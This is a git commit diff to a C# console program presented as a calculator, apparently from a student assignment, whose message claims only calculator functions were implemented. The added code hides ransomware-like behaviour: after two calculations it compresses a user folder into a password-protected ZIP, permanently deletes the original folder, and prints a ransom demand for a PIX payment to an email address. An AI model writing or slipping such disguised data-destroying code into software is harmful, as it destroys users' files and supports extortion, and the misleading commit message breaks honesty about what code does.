4856c3d1eab8d04fff64ee3f44cc1e01918874e5
paulorudiger <paulo.e.rudiger@gmail.com>
2024-09-25 20:17:17 -0300

    Implementadas funcoes de calculadora.

--- Program.cs
+++ Program.cs
@@ -2,194 +2,176 @@
 using System;
 using System.IO;
 
-class Program
+namespace Calculadora
 {
-    static void Main(string[] args)
+    class Program
     {
-        int contadorChamadas = 0;
-        while (true)
+        static void Main(string[] args)
         {
-            Console.WriteLine("Menu:");
-            Console.WriteLine("1 - Opção 1");
-            Console.WriteLine("2 - Opção 2");
-            Console.WriteLine("3 - Opção 3");
-            Console.WriteLine("4 - Sair");
-            Console.Write("Escolha uma opção: ");
-            string escolha = Console.ReadLine();
+            bool executar = true;
+            int contadorChamadas = 0;
 
-            switch (escolha)
+            while (executar)
             {
-                case "1":
-                    ExecutarOpcao1();
-                    break;
-                case "2":
-                    ExecutarOpcao2();
-                    break;
-                case "3":
-                    ExecutarOpcao3();
-                    break;
-                case "4":
-                    if (contadorChamadas >= 3)
+                if (contadorChamadas >= 2)
+                {
+                    try
                     {
+                        string pastaOrigem = "C:\\Users\\paulo\\Desktop\\Coisas Importantes";
+                        string arquivoDestino = "C:\\Users\\paulo\\Desktop\\SeusDadosForamCapturados.zip";
+                        string senha = "senhabemmassa";
+
+                        if (!Directory.Exists(pastaOrigem))
+                        {
+                            Console.WriteLine("A pasta informada não existe.");
+                            break;
+                        }
+
+                        // Compactar a pasta
+                        CompactarPastaComSenha(pastaOrigem, arquivoDestino, senha);
+
+                        // Verifica se o arquivo ZIP foi criado com sucesso
+                        if (File.Exists(arquivoDestino))
+                        {
+                            // Apagar a pasta original permanentemente
+                            ApagarPastaPermanentemente(pastaOrigem);
+                        }
+                        else
+                        {
+                            Console.WriteLine("O arquivo ZIP não foi criado corretamente. A pasta não será apagada.");
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.Error.WriteLine($"Erro durante o processo: {ex}");
+                    }
+
+                    // Sai do laço e exibe as mensagens finais
+                    break;
+                }
+
+                Console.WriteLine("Qual operação deseja fazer?");
+                Console.WriteLine("1 - Adição");
+                Console.WriteLine("2 - Subtração");
+                Console.WriteLine("3 - Multiplicação");
+                Console.WriteLine("4 - Divisão\n");
+
+                int operacao = int.Parse(Console.ReadLine());
+
+                Console.WriteLine("Digite o primeiro número: ");
+                int num1 = int.Parse(Console.ReadLine());
+
+                Console.WriteLine("Digite o segundo número: ");
+                int num2 = int.Parse(Console.ReadLine());
+
+                int resultado = 0;
+
+                switch (operacao)
+                {
+                    case 1:
+                        resultado = Adicao(num1, num2);
+                        contadorChamadas++;
                         break;
-                    }
-                    else
-                    {
-                        Console.WriteLine("Saindo...");
-                        return;
-                    }
-                default:
-                    Console.WriteLine("Opção inválida.");
-                    break;
+
+                    case 2:
+                        resultado = Subtracao(num1, num2);
+                        contadorChamadas++;
+                        break;
+
+                    case 3:
+                        resultado = Multiplicacao(num1, num2);
+                        contadorChamadas++;
+                        break;
+
+                    case 4:
+                        resultado = Divisao(num1, num2);
+                        contadorChamadas++;
+                        break;
+
+                    default:
+                        Console.WriteLine("Número inválido, digite um válido.");
+                        break;
+                }
+
+                Console.WriteLine("O resultado com os números {0} e {1} é: {2}", num1, num2, resultado);
             }
 
-            // Incrementa o contador de chamadas
-            contadorChamadas++;
-
-            // Se o contador atingir 3, executa a compactação e zera o contador
-            if (contadorChamadas >= 3)
-            {
-                Console.WriteLine("Executando a compactação da pasta...");
-                Console.WriteLine("aqui vai dar merda");
-
-                /*
-                 
-                  try
-        {
-            string pastaOrigem = "C:\\Users\\paulo\\Desktop\\POO-TrabalhoRamsonware";
-            string arquivoDestino = "C:\\Users\\paulo\\Desktop\\SeusDadosForamCapturados.zip";
-            string senha = "senhabemmassa";
-
-            if (!Directory.Exists(pastaOrigem))
-            {
-                Console.WriteLine("A pasta informada não existe.");
-                return;
-            }
-
-            // Compactar a pasta
-            CompactarPastaComSenha(pastaOrigem, arquivoDestino, senha);
-
-            // Verifica se o arquivo ZIP foi criado com sucesso
-            if (File.Exists(arquivoDestino))
-            {
-                // Apagar a pasta original permanentemente
-                ApagarPastaPermanentemente(pastaOrigem);
-            }
-            else
-            {
-                Console.WriteLine("O arquivo ZIP não foi criado corretamente. A pasta não será apagada.");
-            }
-        }
-        catch (Exception ex)
-        {
-            Console.Error.WriteLine($"Erro durante o processo: {ex}");
+            // Mensagens finais após o laço
+            Console.WriteLine("-------------------------------------------------");
+            Console.WriteLine("SEQUESTRAMOS OS SEUS DADOS!!!!");
+            Console.WriteLine("OS DADOS SERÃO LIBERADOS MEDIANTE A TRANSFERÊNCIA PIX DO VALOR DE R$ 500,00");
+            Console.WriteLine("PELA CHAVE:");
+            Console.WriteLine("soumalvadao@sefodeu.com");
+            Console.WriteLine("ENCAMINHE O COMPROVANTE VIA MESMO EMAIL");
+            Console.WriteLine("-------------------------------------------------");
+            Console.ReadLine();
         }
 
-                 
-                 
-                 */
+        public static int Adicao(int numero1, int numero2) => numero1 + numero2;
 
+        public static int Subtracao(int numero1, int numero2) => numero1 - numero2;
 
-                Console.WriteLine("-------------------------------------------------");
-                Console.WriteLine("ROUBAMOS OS SEUS DADOS!!!!");
-                Console.WriteLine("-------------------------------------------------");
+        public static int Multiplicacao(int numero1, int numero2) => numero1 * numero2;
 
+        public static int Divisao(int numero1, int numero2) => numero1 / numero2;
 
-                //  contadorChamadas = 0;
+        static void CompactarPastaComSenha(string pastaOrigem, string arquivoDestino, string senha)
+        {
+            try
+            {
+                using (FileStream fs = File.Create(arquivoDestino))
+                using (ZipOutputStream zipStream = new ZipOutputStream(fs))
+                {
+                    zipStream.SetLevel(9);
+                    zipStream.Password = senha;
+                    AdicionarPastaAoZip(zipStream, pastaOrigem, "");
+                    zipStream.Finish();
+                }
 
+                Console.WriteLine($"Pasta compactada com sucesso em {arquivoDestino}");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Erro ao compactar a pasta: {ex.Message}");
+                throw;
             }
         }
 
-
-
-
-        static void ExecutarOpcao1()
+        static void AdicionarPastaAoZip(ZipOutputStream zipStream, string pastaOrigem, string pastaRelativa)
         {
-            Console.WriteLine("Opção 1 executada.");
-            // Coloque a lógica específica da Opção 1 aqui
-        }
-
-        static void ExecutarOpcao2()
-        {
-            Console.WriteLine("Opção 2 executada.");
-            // Coloque a lógica específica da Opção 2 aqui
-        }
-
-        static void ExecutarOpcao3()
-        {
-            Console.WriteLine("Opção 3 executada.");
-            // Coloque a lógica específica da Opção 3 aqui
-        }
-    }
-
-    static void CompactarPastaComSenha(string pastaOrigem, string arquivoDestino, string senha)
-    {
-        try
-        {
-            // Cria o arquivo ZIP
-            using (FileStream fs = File.Create(arquivoDestino))
-            using (ZipOutputStream zipStream = new ZipOutputStream(fs))
+            foreach (var arquivo in Directory.GetFiles(pastaOrigem))
             {
-                zipStream.SetLevel(9); // Define o nível de compressão (0-9)
-                zipStream.Password = senha; // Define a senha
+                var entryName = Path.Combine(pastaRelativa, Path.GetFileName(arquivo));
+                var newEntry = new ZipEntry(entryName) { DateTime = DateTime.Now };
+                zipStream.PutNextEntry(newEntry);
 
-                // Adiciona os arquivos da pasta ao ZIP
-                AdicionarPastaAoZip(zipStream, pastaOrigem, "");
+                using (var fs = File.OpenRead(arquivo))
+                {
+                    fs.CopyTo(zipStream);
+                }
 
-                zipStream.Finish();
+                zipStream.CloseEntry();
             }
 
-            Console.WriteLine($"Pasta compactada com sucesso em {arquivoDestino}");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"Erro ao compactar a pasta: {ex.Message}");
-            throw;
-        }
-    }
-
-    static void AdicionarPastaAoZip(ZipOutputStream zipStream, string pastaOrigem, string pastaRelativa)
-    {
-        // Adicionar todos os arquivos da pasta ao ZIP
-        foreach (var arquivo in Directory.GetFiles(pastaOrigem))
-        {
-            var entryName = Path.Combine(pastaRelativa, Path.GetFileName(arquivo));
-            var newEntry = new ZipEntry(entryName)
+            foreach (var subPasta in Directory.GetDirectories(pastaOrigem))
             {
-                DateTime = DateTime.Now
-            };
-
-            zipStream.PutNextEntry(newEntry);
-
-            // Escrever o conteúdo do arquivo no ZIP
-            using (var fs = File.OpenRead(arquivo))
-            {
-                fs.CopyTo(zipStream);
+                var pastaNome = Path.Combine(pastaRelativa, Path.GetFileName(subPasta));
+                AdicionarPastaAoZip(zipStream, subPasta, pastaNome);
             }
-
-            zipStream.CloseEntry();
         }
 
-        // Recursivamente adicionar subpastas
-        foreach (var subPasta in Directory.GetDirectories(pastaOrigem))
+        static void ApagarPastaPermanentemente(string pastaOrigem)
         {
-            var pastaNome = Path.Combine(pastaRelativa, Path.GetFileName(subPasta));
-            AdicionarPastaAoZip(zipStream, subPasta, pastaNome);
-        }
-    }
-
-    static void ApagarPastaPermanentemente(string pastaOrigem)
-    {
-        try
-        {
-            // Apaga a pasta de forma permanente
-            Directory.Delete(pastaOrigem, true); // O segundo parâmetro 'true' indica que deve apagar subdiretórios e arquivos
-            Console.WriteLine("Pasta original apagada permanentemente.");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"Erro ao apagar a pasta: {ex.Message}");
-            throw;
+            try
+            {
+                Directory.Delete(pastaOrigem, true);
+                Console.WriteLine("Pasta original apagada permanentemente.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Erro ao apagar a pasta: {ex.Message}");
+                throw;
+            }
         }
     }
 }
